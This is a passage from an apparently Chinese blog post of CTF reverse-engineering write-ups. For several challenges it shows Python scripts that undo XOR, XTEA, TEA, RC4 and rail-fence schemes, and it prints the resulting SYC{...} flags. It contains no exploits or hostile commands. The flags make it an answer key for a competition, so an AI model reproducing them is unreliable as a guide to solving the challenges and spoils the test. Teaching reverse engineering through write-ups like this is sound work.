class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">const</span> <span class="type">unsigned</span> __int8 *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    a1[i] ^= a2[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单异或运算，提取密文：<code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218</code>，密钥：<code>Syclove</code>，Cyberchef异或操作得 <code>SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;</code>。</p><p>​    </p><h3 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h3><blockquote><p>Flower ?or tea? or flower tea?</p></blockquote><p>去除jmp花指令，全局替换 <code>74 03 75 01 XX</code> 为 <code>90 90 90 90 90</code> (NOP)。</p><p>看伪码为魔改XTEA算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">75</span>,  <span class="number">70</span>, <span class="number">249</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">184</span>,  <span class="number">23</span>, <span class="number">196</span>,  <span class="number">19</span>, <span class="number">167</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">178</span>, <span class="number">232</span>, <span class="number">169</span>,  <span class="number">59</span>, <span class="number">201</span>,  <span class="number">78</span>, <span class="number">228</span>, <span class="number">243</span>, <span class="number">148</span>, </span><br><span class="line">  <span class="number">181</span>,  <span class="number">42</span>, <span class="number">204</span>, <span class="number">181</span>,  <span class="number">44</span>, <span class="number">228</span>,  <span class="number">81</span>,  <span class="number">68</span>, <span class="number">154</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">122</span>,   <span class="number">8</span>, <span class="number">208</span>, <span class="number">200</span>,  <span class="number">83</span>,  <span class="number">73</span>, <span class="number">123</span>,  <span class="number">17</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">148</span>, <span class="number">215</span>, <span class="number">255</span>, <span class="number">155</span>, <span class="number">249</span>,  <span class="number">45</span>, <span class="number">255</span>,  <span class="number">94</span>,  <span class="number">49</span>,  <span class="number">37</span>, </span><br><span class="line">  <span class="number">231</span>,  <span class="number">23</span>, <span class="number">121</span>, <span class="number">153</span>, <span class="number">189</span>, <span class="number">223</span>,  <span class="number">58</span>,  <span class="number">27</span>, <span class="number">135</span>, <span class="number">143</span>, </span><br><span class="line">  <span class="number">172</span>, <span class="number">197</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">112</span>, <span class="number">134</span>, <span class="number">178</span>, <span class="number">105</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">246</span>,  <span class="number">90</span>,  <span class="number">36</span>, <span class="number">218</span>, <span class="number">247</span>,  <span class="number">44</span>, <span class="number">175</span>, <span class="number">102</span>, <span class="number">123</span>,  <span class="number">52</span>, </span><br><span class="line">   <span class="number">96</span>,  <span class="number">77</span>, <span class="number">200</span>, <span class="number">185</span>,  <span class="number">47</span>, <span class="number">145</span>,  <span class="number">30</span>, <span class="number">145</span>, <span class="number">155</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">189</span>,  <span class="number">58</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">104</span>, <span class="number">153</span>, <span class="number">197</span>, </span><br><span class="line">  <span class="number">233</span>,  <span class="number">19</span>,   <span class="number">0</span>, <span class="number">160</span>, <span class="number">164</span>,  <span class="number">78</span>,  <span class="number">47</span>, <span class="number">193</span>,  <span class="number">16</span>,  <span class="number">58</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">222</span>, <span class="number">148</span>, <span class="number">213</span>, <span class="number">196</span>, <span class="number">160</span>,  <span class="number">60</span>, <span class="number">152</span>, <span class="number">128</span>,  <span class="number">67</span>, </span><br><span class="line">   <span class="number">72</span>, <span class="number">118</span>,  <span class="number">47</span>, <span class="number">126</span>, <span class="number">137</span>, <span class="number">220</span>,  <span class="number">77</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">166</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">63</span>, <span class="number">153</span>,  <span class="number">49</span>, <span class="number">141</span>, <span class="number">181</span>,  <span class="number">23</span>, <span class="number">229</span>,  <span class="number">74</span>,  <span class="number">96</span>, </span><br><span class="line">  <span class="number">132</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">156</span>, <span class="number">129</span>,  <span class="number">68</span>, <span class="number">224</span>, <span class="number">244</span>, <span class="number">255</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">244</span>,  <span class="number">60</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">32</span>,<span class="number">27</span>,<span class="number">39</span>,<span class="number">44</span>]</span><br><span class="line">rounds = <span class="number">54</span></span><br><span class="line">delta = <span class="number">0x31415927</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">fl = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>][::-<span class="number">1</span>]</span><br><span class="line">    m = decrypt(cc)</span><br><span class="line">    fr = long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>] + fr</span><br><span class="line">    fl += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fl)</span><br><span class="line"><span class="built_in">print</span>(fr)</span><br><span class="line"><span class="built_in">print</span>(fl+fr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h3><blockquote><p>Why so serious?</p></blockquote><p>动调，得到第二个对输入的加密逻辑为TEA算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">240</span>, <span class="number">249</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">196</span>, <span class="number">148</span>,  <span class="number">97</span>, <span class="number">226</span>,  <span class="number">37</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">121</span>, <span class="number">128</span>,  <span class="number">25</span>, <span class="number">194</span>,  <span class="number">15</span>,  <span class="number">31</span>,  <span class="number">21</span>,  <span class="number">24</span>, <span class="number">106</span>, <span class="number">235</span>, </span><br><span class="line">  <span class="number">197</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">132</span>, <span class="number">133</span>,  <span class="number">58</span>, <span class="number">204</span>,  <span class="number">64</span>, <span class="number">187</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">210</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    m = decrypt(cc,k)</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><blockquote><p>美丽的IDA控制流视图 like Rainbow!</p></blockquote><p>LLVM去平坦化：</p><p><code>python3 deflat.py -f ./rainbow --addr 0x401160</code></p><p>再简单逆回去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x627B44508E415865</span>,<span class="number">0x847D6C49547E4A57</span>,<span class="number">0x4877646060955B4F</span>,<span class="number">0x622D3C689F7B4D7D</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        cc[i] -= <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="小黄鸭"><a href="#小黄鸭" class="headerlink" title="小黄鸭"></a>小黄鸭</h3><blockquote><p>小黄鸭的钥匙被一个叫毗外的大坏鸭偷走了,你能帮它找到钥匙吗?</p></blockquote><p>python反编译，得到1.pyc，修复为3.7的文件头 <code>550d0d0a</code>，还原python代码。</p><p>密文：<code>~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH</code></p><p>Cyberchef解：ROT93+Reverse+ROT12</p><p>得到：<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125;</code></p><p>修正一下得flag：<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125;</code></p><p>​    </p><h3 id="寻找初音未来"><a href="#寻找初音未来" class="headerlink" title="寻找初音未来"></a>寻找初音未来</h3><blockquote><p>正确的输入即可解救Miku~(图有点大了忍一下)</p></blockquote><p>Go程序，代码逻辑为RC4，动调得 <code>key=&#39;C&#39;*18</code>。</p><p>输入问题 <code>初音未来色是多少?(输入为16进制,如0x123abc则输入123abc)</code> 答案 <code>39C5BB</code>，提取密文，RC4解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;C&#x27;</span>*<span class="number">18</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = [ <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0xF9</span>, <span class="number">0xE0</span>, <span class="number">0xCF</span>, <span class="number">0x3F</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x7B</span>, <span class="number">0x81</span>, <span class="number">0xBF</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x0D</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xB9</span>, <span class="number">0x98</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xEC</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0xB2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">S[i] = i</span><br><span class="line">Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">j = (j + S[i] + Key[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">i = (i + <span class="number">1</span>) % N</span><br><span class="line">j = (j + S[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line">t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="浪漫至死不渝"><a href="#浪漫至死不渝" class="headerlink" title="浪漫至死不渝"></a>浪漫至死不渝</h3><blockquote><p>某师傅想给他的女神表白，他写了一个网站，点爱心之后就能输入密码，但是在写的过程中他不小心把提示的密码删除了，你能帮他找出表白密码吗？(输入密码时，记得刷新喔） ps:请将密码包裹SYC{}上交，且将字母全改为大写</p></blockquote><p>js文件加密逻辑分析。</p><p>key为Text1，采用了栅栏密码加密得到 <code>53X211WH04N</code>，利用现有的 <code>decryptRailFence()</code> 函数解密：</p><p><code>decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39;</code></p><p>密文为：<code>125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99</code></p><p>加密逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&lt;14 时：c[i]=(m[i]^k[i%7])+10</span><br><span class="line">i&gt;=14 时：c[i]=(m[i]^k[i-7])+99</span><br></pre></td></tr></table></figure><p>还原明文代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;5201314WXHN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">10</span>)^k[i%<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">99</span>)^k[i-<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;FJIAXUEFJIAXUEWXHN&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;FJIAXUEFJIAXUEWXHN&#125;</code></p><p>​    </p><h3 id="AES-AES"><a href="#AES-AES" class="headerlink" title="AES! AES?"></a>AES! AES?</h3><blockquote><p>What’s this ?</p></blockquote><p>照逻辑尝试逆向即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">v17 = [<span class="number">224</span>, -<span class="number">251</span>, -<span class="number">146</span>, -<span class="number">62</span>, -<span class="number">146</span>, -<span class="number">103</span>, -<span class="number">152</span>, <span class="number">69</span>, -<span class="number">131</span>, -<span class="number">225</span>, -<span class="number">193</span>, -<span class="number">7</span>, -<span class="number">105</span>, -<span class="number">138</span>, <span class="number">59</span>, <span class="number">146</span>, <span class="number">47</span>, -<span class="number">188</span>, -<span class="number">250</span>, -<span class="number">153</span>, -<span class="number">88</span>, -<span class="number">21</span>, -<span class="number">20</span>, <span class="number">74</span>, -<span class="number">145</span>, -<span class="number">24</span>, -<span class="number">203</span>, -<span class="number">7</span>, -<span class="number">84</span>, -<span class="number">89</span>, <span class="number">140</span>, <span class="number">113</span>]</span><br><span class="line">c = [k&amp;<span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> v17]</span><br><span class="line"></span><br><span class="line">v16 = [<span class="number">110</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">117</span>, <span class="number">121</span>, <span class="number">120</span>, </span><br><span class="line">  <span class="number">129</span>, <span class="number">105</span>, <span class="number">93</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">73</span>]</span><br><span class="line"></span><br><span class="line">v13 = [<span class="number">122</span>, <span class="number">118</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">127</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">124</span>,  <span class="number">42</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">113</span>,  <span class="number">68</span>,  <span class="number">42</span>,  <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">v14 = v15 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">131</span>, <span class="number">111</span>, <span class="number">125</span>,  <span class="number">43</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>,  <span class="number">42</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">124</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">124</span>, <span class="number">115</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">126</span>,  <span class="number">43</span>,  <span class="number">20</span>, </span><br><span 